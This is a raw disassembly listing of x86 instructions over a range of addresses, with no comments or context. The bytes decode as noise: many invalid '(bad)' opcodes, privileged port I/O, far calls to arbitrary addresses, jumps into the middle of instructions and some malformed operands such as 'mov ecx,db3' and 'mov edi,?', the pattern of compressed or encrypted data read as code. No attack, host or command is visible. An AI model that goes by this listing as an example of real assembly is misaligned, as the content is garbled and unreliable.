  421fd0:	xchg   esi,eax
  421fd1:	aaa    
  421fd2:	or     al,0x22
  421fd4:	mov    ebp,0x829ff3c1
  421fd9:	inc    ebp
  421fda:	mov    edi,0x9750098a
  421fdf:	jb     0x422006
  421fe1:	push   ecx
  421fe2:	ret    0xd541
  421fe5:	adc    al,BYTE PTR [ecx]
  421fe7:	out    dx,al
  421fe8:	jg     0x422023
  421fea:	xor    DWORD PTR [edi+ecx*8],esp
  421fed:	mov    eax,ds:0x109ea50d
  421ff2:	sub    BYTE PTR [edx+edx*8],bh
  421ff5:	pop    ebp
  421ff6:	ins    DWORD PTR es:[edi],dx
  421ff7:	mov    ch,0x28
  421ff9:	dec    esi
  421ffa:	sahf   
  421ffb:	add    eax,0xb4940128
  422000:	cmp    BYTE PTR [edx],bl
  422002:	inc    esi
  422003:	or     dh,0xb1
  422006:	mov    DWORD PTR [ecx],esp
  422008:	and    eax,0x21b683dc
  42200d:	fisubr DWORD PTR [esi+0x8939e6d]
  422013:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422014:	mov    eax,0xd960e9ea
  422019:	sub    al,0x2e
  42201b:	fdivr  st,st(1)
  42201d:	add    al,0x71
  42201f:	mov    WORD PTR [edi+0xe932b32],es
  422025:	(bad)  
  422026:	in     eax,dx
  422027:	out    dx,eax
  422028:	or     ax,0x39aa
  42202c:	pop    ds
  42202d:	cli    
  42202e:	fdiv   DWORD PTR [edx-0x2e]
  422031:	or     al,0x60
  422033:	mov    ds:0x9c0d2dcb,al
  422038:	jp     0x422056
  42203a:	aam    0xdf
  42203c:	(bad)  
  42203d:	jl     0x421fcc
  42203f:	ret    0xb24a
  422042:	dec    ecx
  422043:	push   ss
  422044:	dec    edi
  422045:	imul   ebx,DWORD PTR [edx],0xcfcf3380
  42204b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42204d:	xchg   DWORD PTR ds:0x65a70e22,esp
  422053:	aad    0xcb
  422055:	(bad)  
  422056:	(bad)  [edx+0x1d8810ce]
  42205c:	fstp   QWORD PTR [eax+0x75]
  42205f:	addr16 mov esp,0x7e0b4898
  422065:	adc    ebx,DWORD PTR [ebx-0x1ac4a296]
  42206b:	loope  0x422074
  42206d:	mov    al,0x96
  42206f:	push   ebx
  422070:	sar    BYTE PTR [ebx-0x47],1
  422073:	add    eax,0x7af1054e
  422078:	jp     0x422004
  42207a:	jne    0x422032
  42207c:	gs inc ecx
  42207e:	stc    
  42207f:	xchg   edx,eax
  422080:	dec    DWORD PTR [edi+0x622a7cc2]
  422086:	fstp   TBYTE PTR [edi-0x5c]
  422089:	push   ebx
  42208a:	adc    BYTE PTR ds:0x3c36c477,ch
  422090:	push   edi
  422091:	dec    esp
  422092:	mov    edi,ecx
  422094:	test   BYTE PTR [ecx-0x2c7f49be],ch
  42209a:	fmulp  st(2),st
  42209c:	pop    esp
  42209d:	xchg   edx,eax
  42209e:	jns    0x4220b5
  4220a0:	lea    edi,[ebx]
  4220a2:	rcr    DWORD PTR [ebx],0x10
  4220a5:	lock dec esi
  4220a7:	xchg   edx,eax
  4220a8:	outs   dx,BYTE PTR ds:[esi]
  4220a9:	ins    BYTE PTR es:[edi],dx
  4220aa:	lods   eax,DWORD PTR ds:[esi]
  4220ab:	cmp    DWORD PTR [edx+0x0],ebp
  4220b1:	add    BYTE PTR [ecx],bh
  4220b3:	stc    
  4220b4:	pop    ebx
  4220b5:	sub    ebx,ebx
  4220b7:	stos   DWORD PTR es:[edi],eax
  4220b8:	jns    0x4220b5
  4220ba:	dec    edx
  4220bb:	sub    bl,0xe9
  4220be:	je     0x4220d5
  4220c0:	sbb    al,0x3f
  4220c2:	jno    0x42205e
  4220c4:	add    DWORD PTR [eax],eax
  4220c6:	repz add al,0x0
  4220c9:	add    BYTE PTR [ebx+0x434cfd8f],dh
  4220cf:	in     eax,dx
  4220d0:	push   esi
  4220d1:	hlt    
  4220d2:	or     al,0x63
  4220d4:	mov    bl,0xa3
  4220d6:	cmp    al,0xfd
  4220d8:	xor    ch,BYTE PTR [esi]
  4220da:	jb     0x4220ab
  4220dc:	jecxz  0x4220d8
  4220de:	xchg   esi,eax
  4220df:	and    al,0x57
  4220e1:	sub    al,0x7f
  4220e3:	pop    eax
  4220e4:	dec    DWORD PTR [esi-0x5bbb816b]
  4220ea:	jl     0x4220ca
  4220ec:	pop    edx
  4220ed:	lods   eax,DWORD PTR ds:[esi]
  4220ee:	ja     0x4220fd
  4220f0:	xchg   ecx,eax
  4220f1:	cli    
  4220f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220f3:	push   ebp
  4220f4:	xlat   BYTE PTR ds:[ebx]
  4220f5:	(bad)  
  4220f7:	sub    BYTE PTR [edi+ebp*2-0x4a0a450f],0xb8
  4220ff:	enter  0x11f1,0xc3
  422103:	and    eax,DWORD PTR [eax-0x3ff948ce]
  422109:	fwait
  42210a:	xchg   ebp,eax
  42210b:	push   DWORD PTR [eax-0x1ce0c9da]
  422111:	arpl   WORD PTR [ebp-0x6f],bp
  422114:	xchg   edx,eax
  422115:	and    edi,DWORD PTR [ecx-0x20]
  422118:	bound  esp,QWORD PTR [edx-0x4c]
  42211b:	jbe    0x422139
  42211d:	sti    
  42211e:	xchg   edi,eax
  42211f:	and    BYTE PTR [esi-0x63],ah
  422122:	jg     0x4220ca
  422124:	ret    
  422125:	gs xchg esi,eax
  422127:	fwait
  422128:	cmp    eax,0xcbf5f2fd
  42212d:	lds    edx,FWORD PTR [edi+esi*2-0x634b7659]
  422134:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  422136:	pop    ebx
  422137:	push   eax
  422138:	ins    DWORD PTR es:[edi],dx
  422139:	call   0x77e0:0x2d78704b
  422140:	inc    ebx
  422141:	xchg   edi,eax
  422142:	sbb    bl,BYTE PTR [ecx+ebp*1-0x1b132c04]
  422149:	and    al,ch
  42214b:	ret    
  42214c:	dec    edx
  42214d:	mov    ecx,0x7acbffc3
  422152:	adc    ecx,edx
  422154:	jno    0x422127
  422156:	jns    0x4220f9
  422158:	rcr    BYTE PTR [edi],cl
  42215a:	fistp  WORD PTR [edi+ecx*2-0x49c3247c]
  422161:	and    ecx,edx
  422163:	es xchg ecx,eax
  422165:	(bad)  
  422166:	aad    0x98
  422168:	add    eax,0x79ffaae4
  42216d:	mov    DWORD PTR [ecx-0x54a00182],esi
  422173:	push   cs
  422174:	je     0x4221e8
  422176:	gs test eax,0x5845600a
  42217c:	jl     0x422102
  42217e:	lods   eax,DWORD PTR ds:[esi]
  42217f:	sbb    al,0x87
  422181:	les    ebp,FWORD PTR [esi+ebx*8-0x5b38f9dc]
  422188:	xor    al,0xc6
  42218a:	clc    
  42218b:	in     al,dx
  42218c:	xchg   ebx,eax
  42218d:	lahf   
  42218e:	fwait
  42218f:	pop    ebx
  422190:	(bad)  
  422191:	loope  0x42213b
  422193:	div    DWORD PTR [esi]
  422195:	and    eax,0x79a14860
  42219a:	xchg   esi,eax
  42219b:	dec    edx
  42219c:	inc    esi
  42219d:	lea    ecx,[ebx+0x473ede14]
  4221a3:	mov    edi,0xed28edfb
  4221a8:	popf   
  4221a9:	jbe    0x422137
  4221ab:	les    ecx,FWORD PTR [ebp-0x4a]
  4221ae:	mov    dx,0x69ad
  4221b2:	and    edi,edx
  4221b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221b5:	jne    0x422138
  4221b7:	stos   DWORD PTR es:[edi],eax
  4221b8:	addr16 fwait
  4221ba:	push   ecx
  4221bb:	mov    ecx,0xaf71580
  4221c0:	xor    eax,0xb1b2613a
  4221c5:	imul   esi,DWORD PTR [esi],0x5837a5bf
  4221cb:	cmp    BYTE PTR [ebx+0x41d273ef],dl
  4221d1:	scas   eax,DWORD PTR es:[edi]
  4221d2:	inc    ecx
  4221d3:	pusha  
  4221d4:	into   
  4221d5:	sub    DWORD PTR [ecx],edx
  4221d7:	int3   
  4221d8:	cli    
  4221d9:	jecxz  0x4221ab
  4221db:	pop    ss
  4221dc:	dec    esi
  4221dd:	(bad)  
  4221de:	and    edi,DWORD PTR [ecx-0x380fad28]
  4221e4:	and    BYTE PTR [edx+esi*8-0x4f],ch
  4221e8:	popa   
  4221e9:	add    al,0xeb
  4221eb:	scas   eax,DWORD PTR es:[edi]
  4221ec:	mov    ebp,0xe1fbe6dc
  4221f1:	mov    ah,0xbc
  4221f3:	jbe    0x422211
  4221f5:	push   edi
  4221f6:	jle    0x42221a
  4221f8:	outs   dx,DWORD PTR ds:[esi]
  4221f9:	test   eax,0x7d9752b1
  4221fe:	or     ebp,DWORD PTR [ecx]
  422200:	(bad)  
  422202:	test   al,0xe9
  422204:	and    ebp,DWORD PTR [eax-0xd1e44cb]
  42220a:	in     eax,0x5e
  42220c:	mov    BYTE PTR [ebp+0x0],cl
  42220f:	adc    edi,edx
  422211:	call   0x81468eb0
  422216:	jl     0x422210
  422218:	mov    ah,0x77
  42221a:	scas   al,BYTE PTR es:[edi]
  42221b:	jg     0x422221
  42221d:	adc    ah,dh
  42221f:	add    esi,esp
  422221:	pop    es
  422222:	xchg   bx,ax
  422224:	inc    edx
  422225:	mov    edi,0xe4e077ac
  42222a:	lahf   
  42222b:	jns    0x4221b2
  42222d:	xor    dh,dl
  42222f:	and    DWORD PTR [eax],esi
  422231:	and    cl,BYTE PTR [eax-0x3e980dfb]
  422237:	ja     0x4221fa
  422239:	test   dh,dl
  42223b:	inc    edx
  42223c:	repz dec edi
  42223e:	mov    ds:0x85dfb381,eax
  422243:	(bad)  
  422244:	test   eax,0xa6ad0531
  422249:	stos   BYTE PTR es:[edi],al
  42224a:	mov    edx,0x3702b34
  42224f:	(bad)  
  422250:	mov    WORD PTR [edx-0x6103389c],?
  422256:	retf   0x5c49
  422259:	inc    edi
  42225a:	pop    ss
  42225b:	push   0xffffffb8
  42225d:	lods   eax,DWORD PTR ds:[esi]
  42225e:	fstp   TBYTE PTR [edi]
  422260:	popf   
  422261:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422262:	dec    edi
  422263:	or     eax,0xc7fb3e6e
  422268:	aaa    
  422269:	cmp    al,BYTE PTR [edi+0x55]
  42226c:	or     al,0xc4
  42226e:	dec    ebp
  42226f:	mov    ch,0x59
  422271:	imul   edi,DWORD PTR [edx+0x78],0xffffffda
  422275:	ror    BYTE PTR [eax+edx*4+0x71],0xed
  42227a:	dec    DWORD PTR [esi+0x62c242c]
  422280:	inc    ebp
  422281:	xor    BYTE PTR [ebx+0x675e50d9],dh
  422287:	iret   
  422288:	xchg   edx,eax
  422289:	retf   0x3b79
  42228c:	call   0x590b2ebd
  422291:	aad    0x50
  422293:	jb     0x422264
  422295:	ret    0x8732
  422298:	and    eax,DWORD PTR [ebp+0x3f]
  42229b:	push   0x3
  42229d:	test   ecx,esi
  42229f:	out    dx,eax
  4222a0:	call   0x3cf1:0x47df0b0b
  4222a7:	mov    DWORD PTR [ecx],esp
  4222a9:	call   0x5a64:0x9e7f63af
  4222b0:	xchg   ebx,eax
  4222b1:	in     al,dx
  4222b2:	jo     0x422291
  4222b4:	in     eax,0x93
  4222b6:	nop
  4222b7:	int    0xfa
  4222b9:	jp     0x42227c
  4222bb:	and    DWORD PTR [edx+0x19],0xffffffdf
  4222bf:	xor    al,0xd4
  4222c1:	pop    ss
  4222c2:	pop    ebp
  4222c3:	in     eax,0x10
  4222c5:	pusha  
  4222c6:	mov    esp,0xcf4f4aa4
  4222cb:	fcomp  QWORD PTR [eax+edi*4-0x52]
  4222cf:	sub    eax,0x11143f88
  4222d4:	jl     0x4222c4
  4222d6:	and    dh,BYTE PTR [edi-0x39]
  4222d9:	dec    ebx
  4222da:	fbld   TBYTE PTR [esi]
  4222dc:	cld    
  4222dd:	add    cl,bl
  4222df:	fldenv [esi+edx*2-0x5c]
  4222e3:	stc    
  4222e4:	add    eax,0x27b06c06
  4222e9:	stc    
  4222ea:	int    0xa4
  4222ec:	pop    ds
  4222ed:	(bad)  
  4222ee:	pop    esp
  4222ef:	mov    ch,cl
  4222f1:	jmp    0x51a2449d
  4222f6:	sub    al,BYTE PTR [ebp-0x49]
  4222f9:	outs   dx,DWORD PTR ds:[esi]
  4222fa:	bound  ebp,QWORD PTR [edi+0x6f]
  4222fd:	jbe    0x42233f
  4222ff:	fnsave [esi+eiz*1+0x61f203d2]
  422306:	fwait
  422307:	push   esi
  422308:	xlat   BYTE PTR ds:[ebx]
  422309:	push   0x1d
  42230b:	pop    ds
  42230c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42230d:	jp     0x422355
  42230f:	mov    BYTE PTR [eax-0x5bb3291f],dl
  422315:	push   0x1bab8b03
  42231a:	add    al,0x6f
  42231c:	push   eax
  42231d:	cld    
  42231e:	loope  0x42232c
  422320:	jmp    0xda3eb7c1
  422325:	xchg   ebx,eax
  422326:	sub    al,0x9f
  422328:	mul    BYTE PTR [ecx]
  42232a:	dec    ecx
  42232b:	mov    al,0xa1
  42232d:	push   ebx
  42232e:	gs das 
  422330:	sub    bl,bh
  422332:	mov    eax,ds:0xba5aea2f
  422337:	push   esp
  422338:	jo     0x422304
  42233a:	jne    0x422388
  42233c:	(bad)  
  42233d:	fnstsw WORD PTR [ebp-0x7deb6617]
  422343:	inc    esi
  422344:	dec    edi
  422345:	cdq    
  422346:	push   cs
  422347:	(bad)  
  422348:	aad    0x2b
  42234a:	nop
  42234b:	add    eax,0x78a1e2d3
  422350:	cmp    ebp,ebp
  422352:	repz jmp 0x79e776fa
  422358:	pop    esp
  422359:	aad    0x66
  42235b:	inc    ebx
  42235c:	loope  0x4222e1
  42235e:	inc    esi
  42235f:	outs   dx,BYTE PTR ds:[esi]
  422360:	and    al,0x2a
  422362:	fdiv   QWORD PTR [edi]
  422364:	ret    0x242f
  422367:	mov    ah,0xb9
  422369:	mov    dh,BYTE PTR [esi-0x6996e797]
  42236f:	sti    
  422370:	test   eax,0xcb8cbaf8
  422375:	xchg   ebx,eax
  422376:	mov    bl,0x8c
  422378:	mov    DWORD PTR [esi],edx
  42237a:	test   al,0xf3
  42237c:	int3   
  42237d:	mov    bh,0x2f
  42237f:	popf   
  422380:	fs test eax,0x5142137d
  422386:	cwde   
  422387:	je     0x42238e
  422389:	mov    ebp,0xfefc7298
  42238e:	mov    al,0xa3
  422390:	mov    ecx,0xd7c1c971
  422395:	enter  0x9be9,0x8b
  422399:	mov    ds:0x1a74c895,al
  42239e:	sbb    al,0x7b
  4223a0:	sbb    BYTE PTR [edi],al
  4223a2:	mov    esi,DWORD PTR [edx-0x6c]
  4223a5:	out    0xe2,eax
  4223a7:	pop    eax
  4223a8:	js     0x4223d6
  4223aa:	jmp    0x422400
  4223ac:	mov    dl,0xb4
  4223ae:	(bad)  
  4223af:	jmp    0x8bb89d1d
  4223b4:	(bad)  
  4223b5:	sbb    dl,ch
  4223b7:	ds (bad) 
  4223b9:	pop    ebx
  4223ba:	xchg   ecx,eax
  4223bb:	push   esi
  4223bc:	outs   dx,DWORD PTR ds:[esi]
  4223bd:	mov    ds:0xa7a1ce34,eax
  4223c2:	jne    0x422368
  4223c4:	jmp    0x3b52e5bf
  4223c9:	add    DWORD PTR [edi+0x70],esi
  4223cc:	jmp    DWORD PTR [esi+0x68]
  4223cf:	dec    ebx
  4223d0:	(bad)  
  4223d1:	mov    edx,0x9f861bb3
  4223d6:	in     eax,0xf4
  4223d8:	mov    esp,0xa40d1fda
  4223dd:	add    DWORD PTR [edx],edx
  4223df:	or     DWORD PTR [eax],0x78a8e2d7
  4223e5:	mov    eax,ds:0x2043f78
  4223ea:	xacquire xchg BYTE PTR [esi+0x4c],bh
  4223ee:	lock int3 
  4223f0:	shl    esi,cl
  4223f2:	(bad)  
  4223f3:	sbb    DWORD PTR ss:[eax-0x27],0xb58a2d6f
  4223fb:	mov    edx,DWORD PTR [ebp+0x71f52ec2]
  422401:	ret    0xe67
  422404:	in     eax,dx
  422405:	clc    
  422406:	xchg   ah,dh
  422408:	push   esp
  422409:	and    ecx,esi
  42240b:	push   0x12
  42240d:	jae    0x4223cd
  42240f:	shl    edx,0xf2
  422412:	ins    BYTE PTR es:[edi],dx
  422413:	test   eax,0x53a83ae
  422418:	push   cx
  42241a:	inc    ebx
  42241b:	mov    ds:0xe47a26e1,al
  422420:	ret    0x27c
  422423:	fisttp WORD PTR [esi-0x67]
  422426:	fcomp  QWORD PTR ds:0xe42b6b25
  42242c:	gs ins DWORD PTR es:[edi],dx
  42242e:	ret    0xd8d2
  422431:	daa    
  422432:	ror    BYTE PTR [esi],1
  422434:	test   al,0xb5
  422436:	pop    ds
  422437:	test   eax,0xbab63931
  42243c:	xor    al,0xcb
  42243e:	rcr    DWORD PTR [esp+ebp*1],1
  422441:	clc    
  422442:	icebp  
  422443:	cdq    
  422444:	xor    al,BYTE PTR [ebx+0x32207b9e]
  42244a:	dec    esp
  42244b:	mov    bl,0x74
  42244d:	gs sti 
  42244f:	pop    ecx
  422450:	repnz sub dh,ch
  422453:	sub    BYTE PTR [esi],0x52
  422456:	mov    ah,0xf7
  422458:	xor    eax,0xbf4fb83d
  42245d:	push   ecx
  42245e:	loope  0x4224b0
  422460:	in     al,dx
  422461:	push   ds
  422462:	imul   ebx,DWORD PTR [edi*4+0x193a83bc],0x5b4c39a8
  42246d:	sub    DWORD PTR [ecx],ebx
  42246f:	adc    eax,0xf610b8ee
  422474:	jl     0x422478
  422476:	sahf   
  422477:	outs   dx,BYTE PTR ds:[esi]
  422478:	xchg   esi,eax
  422479:	ss fdivr st,st(7)
  42247c:	sub    DWORD PTR [ebx],eax
  42247e:	(bad)  
  422480:	fsub   st,st(4)
  422482:	add    BYTE PTR [eax-0x144eb514],bh
  422488:	iret   
  422489:	xchg   ah,al
  42248b:	or     DWORD PTR [ebx+0x73],ebx
  42248e:	xor    BYTE PTR [edi-0x1f940e1f],dl
  422494:	push   ebp
  422495:	dec    edx
  422496:	inc    esp
  422497:	popa   
  422498:	pop    ss
  422499:	push   edx
  42249a:	fcmovnu st,st(2)
  42249c:	icebp  
  42249d:	or     al,0x51
  42249f:	or     eax,0x9f0517bb
  4224a4:	mov    DWORD PTR [eax+0x163cb1be],esp
  4224aa:	sbb    al,0xc5
  4224ac:	cmc    
  4224ad:	adc    dh,BYTE PTR [esi+0x2d23497a]
  4224b3:	push   ebp
  4224b4:	sub    BYTE PTR [ecx],ch
  4224b6:	pop    edi
  4224b7:	jecxz  0x42246f
  4224b9:	push   esi
  4224ba:	psrlq  mm4,QWORD PTR [ecx]
  4224bd:	fstp   QWORD PTR [ebx-0x2bc68b23]
  4224c3:	mov    bl,0xe7
  4224c5:	cld    
  4224c6:	or     BYTE PTR [esp+edi*4+0x75],0x70
  4224cb:	xor    al,0x46
  4224cd:	cmp    eax,0x4ca99653
  4224d2:	push   eax
  4224d3:	out    dx,al
  4224d4:	aas    
  4224d5:	inc    ebx
  4224d6:	loopne 0x422477
  4224d8:	ins    BYTE PTR es:[edi],dx
  4224d9:	out    0xdf,eax
  4224db:	mov    al,0x1a
  4224dd:	xor    al,0xf7
  4224df:	jnp    0x422511
  4224e1:	mov    cl,0xfe
  4224e3:	push   ecx
  4224e4:	and    esp,DWORD PTR [ecx+0x74eb0ac6]
  4224ea:	lods   eax,DWORD PTR ds:[esi]
  4224eb:	sbb    eax,0xf619eab7
  4224f0:	sub    bl,0xb7
  4224f3:	scas   eax,DWORD PTR es:[edi]
  4224f4:	pop    ds
  4224f5:	pop    edx
  4224f6:	addr16 inc edx
  4224f8:	cmp    eax,0xb1bf06e1
  4224fd:	mov    bl,0xf9
  4224ff:	ret    
  422500:	pop    edx
  422501:	xchg   ebp,eax
  422502:	mov    edx,0xca3679fe
  422507:	sbb    eax,DWORD PTR [ebx]
  422509:	xchg   edx,eax
  42250b:	(bad)
  42250e:	ret    0xa663
  422511:	es aad 0x94
  422514:	xchg   BYTE PTR [ecx*4-0x6bd69ae6],bh
  42251b:	bound  ebp,QWORD PTR ds:[esi]
  42251e:	arpl   WORD PTR [eax+eax*4-0x51b20372],bp
  422525:	xchg   esp,eax
  422526:	rol    DWORD PTR [ebx+0x1633fd8a],1
  42252c:	push   ebp
  42252d:	aaa    
  42252e:	pop    eax
  42252f:	push   ecx
  422530:	test   DWORD PTR [edx-0x7ed0ce82],eax
  422536:	cmp    eax,0xd183f174
  42253b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42253c:	stc    
  42253d:	(bad)
  422540:	cmp    ch,BYTE PTR ds:0xb97d9584
  422546:	push   0xa0092350
  42254b:	add    edx,DWORD PTR [edx-0x6e]
  42254e:	in     al,dx
  42254f:	inc    esi
  422550:	mov    DWORD PTR [ebp-0x5b],ecx
  422553:	sub    eax,0xe43c45ca
  422558:	xor    bh,BYTE PTR [eax*2-0x306323f3]
  42255f:	shr    ebx,0xd1
  422562:	xor    ebx,DWORD PTR [ebp-0x4d334729]
  422568:	add    BYTE PTR [edx],ah
  42256a:	pop    ebp
  42256c:	inc    ebx
  42256d:	adc    BYTE PTR ds:0x2a337d9e,dl
  422573:	add    ah,bl
  422575:	xchg   edx,eax
  422576:	fstp   st(6)
  422578:	push   ss
  422579:	inc    esi
  42257a:	mov    eax,ds:0xba8257c1
  42257f:	inc    ebp
  422580:	pusha  
  422581:	fstp   QWORD PTR [esi]
  422583:	retf   0xdcd9
  422586:	pop    esp
  422587:	mov    eax,0x71588642
  42258c:	jge    0x4225b7
  42258e:	into   
  42258f:	pop    ss
  422590:	jl     0x422576
  422592:	jge    0x4225e8
  422594:	cdq    
  422595:	sbb    esi,DWORD PTR [esi-0x5b]
  422598:	pop    ecx
  422599:	mov    ebp,0x6e20423c
  42259e:	xor    al,0x2b
  4225a0:	stc    
  4225a1:	ins    BYTE PTR es:[edi],dx
  4225a2:	mov    ds,ebx
  4225a4:	neg    DWORD PTR [ecx+0x26]
  4225a7:	repnz or DWORD PTR [esi-0x64],edi
  4225ab:	xchg   ecx,eax
  4225ac:	xor    eax,0x9cfc28f9
  4225b1:	nop
  4225b2:	xchg   ebx,eax
  4225b3:	fmul   st(5),st
  4225b5:	js     0x422554
  4225b7:	sbb    eax,0x7a6e26f6
  4225bc:	sub    eax,0x0
  4225c1:	add    dl,cl
  4225c3:	adc    al,0x69
  4225c5:	dec    ecx
  4225c6:	(bad)  
  4225c7:	jge    0x4225b3
  4225c9:	xchg   edi,eax
  4225ca:	outs   dx,DWORD PTR ds:[esi]
  4225cb:	jge    0x422555
  4225cd:	call   0x9f64:0xa9927243
  4225d4:	add    DWORD PTR [eax],eax
  4225d6:	repz add al,0x0
  4225d9:	add    bh,ch
  4225db:	mov    edi,0x9cde0418
  4225e0:	dec    ebp
  4225e1:	(bad)  
  4225e2:	leave  
  4225e3:	retf   
  4225e4:	xchg   ebx,eax
  4225e5:	inc    ebx
  4225e6:	out    dx,eax
  4225e7:	sbb    al,0x11
  4225e9:	pop    ebp
  4225ea:	call   0xe010:0x2014215d
  4225f1:	jb     0x42265c
  4225f3:	or     dh,bh
  4225f5:	or     al,0x97
  4225f7:	adc    eax,0x2fceccf3
  4225fc:	out    dx,eax
  4225fd:	fs test al,0x73
  422600:	aam    0x1d
  422602:	xchg   edx,eax
  422603:	outs   dx,DWORD PTR ds:[esi]
  422604:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  422606:	fs int 0xd7
  422609:	ja     0x4225bc
  42260b:	mov    ebx,0x41a4733c
  422610:	call   0x4ab9:0x36ede49b
  422617:	cli    
  422618:	jne    0x422685
  42261a:	xchg   ebx,eax
  42261b:	or     DWORD PTR es:[esi+0x4f],edi
  42261f:	or     DWORD PTR [ecx-0x4ec0e7bf],eax
  422625:	fdivr  st,st(5)
  422627:	jae    0x4225be
  422629:	inc    ebx
  42262a:	pop    ebp
  42262b:	(bad)  
  42262c:	mov    edx,0x7bad3716
  422631:	mov    bl,cl
  422633:	outs   dx,BYTE PTR ds:[esi]
  422634:	ret    
  422635:	iret   
  422636:	test   DWORD PTR [edi],edx
  422638:	push   ds
  422639:	xor    eax,0xbf10d628
  42263e:	dec    ebp
  42263f:	lods   al,BYTE PTR ds:[esi]
  422640:	jae    0x42265e
  422642:	and    eax,0x38299758
  422647:	shr    BYTE PTR [ebp-0x41],cl
  42264a:	stos   BYTE PTR es:[edi],al
  42264b:	mov    edx,0xc7ab36
  422650:	test   eax,0xb139cc91
  422655:	xor    ebp,DWORD PTR ds:0xefe3ea17
  42265b:	mov    edi,?
  42265d:	pop    ebx
  42265e:	mov    esp,edx
  422660:	jg     0x422692
  422662:	sbb    eax,0x21e1522b
  422667:	mov    ebx,0x957cb047
  42266c:	pop    esi
  42266d:	jmp    DWORD PTR [edi+esi*1-0x50182cfd]
  422674:	xchg   esp,eax
  422675:	push   0x34
  422677:	adc    bl,BYTE PTR [edx]
  422679:	sbb    DWORD PTR [ecx+0x18],eax
  42267c:	repz cld 
  42267e:	sub    dh,bh
  422680:	stos   DWORD PTR es:[edi],eax
  422681:	stos   DWORD PTR es:[edi],eax
  422682:	in     al,dx
  422683:	les    ebx,FWORD PTR [esp+esi*4+0x68]
  422687:	out    0xe3,eax
  422689:	cli    
  42268a:	pop    edi
  42268b:	sub    ecx,edi
  42268d:	jmp    0x5afa126
  422692:	dec    edi
  422693:	ret    0xd6d7
  422696:	and    eax,0x4fa35c60
  42269b:	int3   
  42269c:	ret    
  42269d:	dec    esi
  42269e:	sti    
  42269f:	hlt    
  4226a0:	rcl    BYTE PTR [edx+ecx*4+0x2e],cl
  4226a4:	push   esi
  4226a5:	and    BYTE PTR [si],bl
  4226a8:	push   ss
  4226a9:	mov    BYTE PTR [ebp+0x71],dl
  4226ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ad:	rcr    DWORD PTR [esi],cl
  4226af:	call   0xabf4393f
  4226b4:	ret    
  4226b5:	lahf   
  4226b6:	ins    DWORD PTR es:[edi],dx
  4226b7:	(bad)  
  4226b9:	mov    cl,0x8e
  4226bb:	loop   0x4226d4
  4226bd:	xchg   ebx,eax
  4226be:	mov    ecx,db3
  4226c1:	inc    ebp
  4226c2:	xor    al,0x4c
  4226c4:	jno    0x4226c2
  4226c6:	ret    
  4226c7:	cdq    
  4226c8:	test   BYTE PTR [ebx-0x45],ch
  4226cb:	dec    esp
  4226cc:	(bad)  
  4226cd:	lahf   
  4226ce:	sub    dh,BYTE PTR [edx-0x36dcd2d5]
  4226d4:	sub    edi,DWORD PTR [ebp+0x3ebb288d]
  4226da:	jg     0x42266f
  4226dc:	dec    ebx
  4226de:	sub    eax,0x84d38e3e
  4226e3:	shl    edx,1
  4226e5:	aad    0x4b
  4226e7:	add    esp,DWORD PTR [edi]
  4226e9:	(bad)  
  4226ea:	std    
  4226eb:	xchg   DWORD PTR [ebx+0x33],esp
  4226ee:	push   ebp
  4226ef:	fcom   st(6)
  4226f1:	adc    al,0x4d
  4226f3:	scas   eax,DWORD PTR es:[edi]
  4226f4:	iret   
  4226f5:	es jbe 0x4226d3
  4226f8:	les    edx,FWORD PTR [edi+0x4623c6cf]
  4226fe:	adc    edx,ebp
  422700:	pop    esi
  422701:	ret    
  422702:	jecxz  0x42275c
  422704:	ror    DWORD PTR [eax+0x21],1
  422707:	scas   eax,DWORD PTR es:[edi]
  422708:	mov    ds:0xdbb02fa2,al
  42270d:	push   0x70f97d4a
  422712:	and    BYTE PTR [ebp+esi*8-0xe],ah
  422716:	pop    ebx
  422717:	jecxz  0x422724
  422719:	xchg   edi,eax
  42271a:	shl    BYTE PTR [ebx],cl
  42271c:	(bad)  
  42271d:	out    0x3a,al
  42271f:	inc    ebp
  422720:	rcr    BYTE PTR [eax+0x2dac426c],cl
  422726:	mov    DWORD PTR [esi-0x2a60e1e9],ebp
  42272c:	enter  0xec90,0xbf
  422730:	popf   
  422731:	push   ecx
  422732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422733:	and    eax,0x1fbaf59f
  422738:	mov    ebx,0xc90fb0bf
  42273d:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42273f:	jle    0x42278e
  422741:	call   0x249f:0xcdb11b47
  422748:	and    edi,DWORD PTR [edx-0xb2cf91e]
  42274e:	jns    0x4227bb
  422750:	mov    edi,0x4231f871
  422755:	lods   eax,DWORD PTR ds:[esi]
  422756:	in     al,0x33
  422758:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422759:	call   0x5b92:0x72d7942a
  422760:	jns    0x4227de
  422762:	jle    0x42276f
  422764:	xchg   ebp,eax
  422765:	rol    BYTE PTR [esi],cl
  422767:	adc    esp,DWORD PTR [ebx+0x6e]
  42276a:	mov    ecx,0x74cfc791
  42276f:	or     edi,esp
  422771:	push   ss
  422772:	iret   
  422773:	into   
  422774:	mov    cl,0xed
  422776:	pop    ebx
  422777:	pop    eax
  422778:	mov    ch,cl
  42277a:	pop    ebp
  42277b:	scas   al,BYTE PTR es:[edi]
  42277c:	adc    eax,0xb9792a73
  422781:	stos   BYTE PTR es:[edi],al
  422782:	(bad)  
  422783:	jo     0x422792
  422785:	jo     0x4227a3
  422787:	dec    esi
  422788:	sbb    esi,edx
  42278a:	aam    0x67
  42278c:	test   al,0xd6
  42278e:	adc    DWORD PTR [edi],edi
  422790:	cli    
  422791:	loope  0x422761
  422793:	rcl    cl,cl
  422795:	jnp    0x422772
  422797:	sbb    eax,0x7335ca79
  42279c:	in     eax,0x87
  42279e:	push   esi
  42279f:	mov    bh,0xb1
  4227a1:	xchg   ebx,eax
  4227a2:	xchg   DWORD PTR [edi-0x19],ebx
  4227a5:	addr16 iret 
  4227a7:	or     edx,DWORD PTR [edi]
  4227a9:	lds    eax,FWORD PTR [ecx-0x6f]
